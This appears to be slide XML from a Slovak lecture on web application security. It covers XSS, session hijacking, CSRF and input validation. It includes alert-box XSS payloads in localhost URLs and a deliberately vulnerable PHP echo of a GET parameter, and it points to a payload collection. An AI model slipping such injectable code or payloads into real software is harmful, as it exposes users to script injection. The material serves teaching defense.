              <a:rPr lang="sk-SK" dirty="0"/>
            </a:b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endParaRPr lang="sk-SK" dirty="0"/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Útok:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="584200" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:buSzPts val="1600"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost/security_problems/xss1.html?meno=&lt;script&gt;alert('Toto je XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>útok</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>!')&lt;/script&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;p2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15</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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17E3A5D-A9B6-4E3B-BCD3-16E64B794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540" y="2108810"/>
            <a:ext cx="7167347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var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83009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Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>indexOf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"meno="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"Ahoj "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sk-SK" altLang="sk-SK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decodeURIComponent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7A7A43"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>substring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Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pos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30091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)));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&gt;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XSS útok typu 2 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p30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Chybný skript:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="127000" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1600"/>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="sk-SK" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="557799"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="sk-SK" dirty="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Útok:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost/security_problems/xss2.php?meno=&lt;script&gt;alert('Toto je XSS útok!')&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="sk-SK" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="999999"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="221" name="Google Shape;221;p30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16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79C09D-31DE-4A88-9C25-8165A4106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535" y="2075822"/>
            <a:ext cx="1877437" cy="55399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&lt;?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php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  echo $_GET['nadpis']; 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?&gt;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XSS útok typu 3 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>stored</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="Google Shape;227;p3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Založený na tom, že JS sa vloží do DB a neskôr sa spustí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Najnebezpečnejší typ útoku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Kombinovaný napr. so </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>session hijacking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Ochrana:	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Pri vložení dát do DB, resp. pri ich výpise odstrániť všetky značky HTML (najmä </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)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Používať frameworky, ktoré takúto ochranu majú zabudovanú a správne ich používať</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>!!!</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p3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17</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Útok typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="234" name="Google Shape;234;p32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"Krádež" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> so </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> ID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Útočník sa tak môže prihlásiť pod účtom obete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Spôsoby získania </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> ID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i="1" dirty="0"/>
              <a:t>Session fixation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://en.wikipedia.org/wiki/Session_fixation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>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Ďalšie: odchytávanie paketov (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>packet sniffing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>), XSS útok,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Malware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Ochrana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Fixovanie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> na IP adresu (možné problémy)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Zapracovanie HTTP hlavičky (napr. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t>User agent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>) do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> a pod.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="-298450">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1100"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Nenechávajte na serveri skript s </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1400" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>phpinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>Pre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>čo?</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;p3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18</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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Útok typu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1"/>
              <a:t>Cross-site request forgery</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="241" name="Google Shape;241;p33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Podmienky úspešného útoku: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Web používa na prihlásenie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> (alebo HTTP autentifikáciu)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Útočník vie, ako vyzerá nejaká URL v admin rozhraní (alebo ju odhadne)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Obeť musí byť prihlásená do napadnutej aplikácie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Útočník musí prinútiť obeť, aby prešla na stránku, kde je podvrhnuté URL (sociálne inžinierstvo)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Útočník síce nezíska prístup k aplikácii (príslušné </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>), ale môže zmeniť, vymazať dáta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Všetko, k čomu pozná URL v napadnutej aplikácii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Ochrana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Kontrola hlavičky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Referrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="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sk-SK" dirty="0"/>
              <a:t>(ak sa posiela)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Používanie CSFR tokenu (náhodný generovaný reťazec najlepšie pre každý formulár)  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p33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19</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK" dirty="0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896538AD-5D9E-4649-B3DF-969FEF57404D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3870773" y="4633454"/>
            <a:ext cx="4628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000" dirty="0"/>
              <a:t>Zdroj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1000" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1000" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://cs.wikipedia.org/wiki/Cross-site_request_forgery</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://zdrojak.cz/clanky/co-je-cross-site-request-forgery-a-jak-se-branit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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Zásady tvorby bezpečných web aplikácií</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;p34"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435900" y="1635375"/>
            <a:ext cx="8272200" cy="30441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Nedôverovať používateľom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Istý stupeň paranoje je užitočný :-)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Vžiť sa do role záškodníka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Poznať, aké bezpečnostné problémy existujú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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kontrolovať všetky dáta prichádzajúce do webovej aplikácie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Filtrovanie a overovanie, čo do aplikácie prichádza</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>funkcie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>htmlspecialchars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  <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>strip_tags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1200" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0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Užitočné nastavenia (PHP)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Vyvíjať pri zapnutých chybách </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1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error_reporting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0"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=E_ALL</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="12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 produkčnom serveri (v ostrej prevádzke) naopak vypnúť zobrazovanie chýb!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p3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20</a:t>
            </a:fld>
            <a:endParaRPr lang="sk-SK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D10226-5C2C-8CAB-CD4A-1BD10FABE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Payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>All</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Things</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> 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3E7D142-8AFB-AC2C-072B-D35D52843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https://swisskyrepo.github.io/PayloadsAllTheThings/</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p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FCD6094-17FD-BB45-25B0-FE153756BE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43164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A754F6-2FD3-A420-3CFA-BB50C84EC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Validácia požívateľského vstupu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266A55A-7DF1-B955-36C1-D53D6FFF3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Zabraňuje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nekorektným</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>alebo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>škodlivým</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vstupom</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Zvyšuje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>používateľskú</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>skúsenosť</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (UX)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Minimalizuje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bezpečnostné</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>riziká</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS (Cross-Site Scripting)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSRF (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ak</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>formulár</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spracováva</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>citlivé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dáta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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ED49EC2-F07B-06DE-B664-F939D8990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8645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F18AFD-412E-FDE4-C102-CC1D5B7D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Typy validácie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182BC12-A64C-AC01-637D-2ABE699F2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Client-side (frontend)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Kontrola</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>priamo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>prehliadači</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (JavaScript, HTML5 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>atributy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Rýchla</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>odozva</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> pre </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>používateľa</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Pozor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Nie je </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bezpečná</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dá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obísť</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Server-side (backend)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Overovanie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serveri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> pred </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>uložením</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dát</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Jediná</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>spoľahlivá</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> forma </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ochrany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452183F-1744-9D95-60DE-55C3136507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272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4B866AB-106A-5E0F-DFE6-B1F22504E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Príklady </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>client-side</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> validácie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BE4BE77-8603-AF75-49DE-AB9AFC4ADB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24</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB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D68C912E-0D51-4FC7-E1F7-4A0142B16525}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="189104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/>
              <a:t>HTML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;input type="email" required&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;input type="number" min="1" max="100"&gt;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2606DD30-3F92-4030-48A2-A971E1C5D564}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="435894" y="342116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/>
              <a:t>JS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if (!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>email.includes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>('@')) { alert('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Neplatný</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> email'); }</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4227192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591FBE-72A8-DCFB-DE32-66B3BBBC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Validácia na serveri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43DAF22-4A0E-759A-D4F1-998D5AE14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Vlastné algoritmy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> má vstavanú funkciu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>filter_var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Validácia vstupu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>vs</a:t>
            </a:r>
            <a:r>
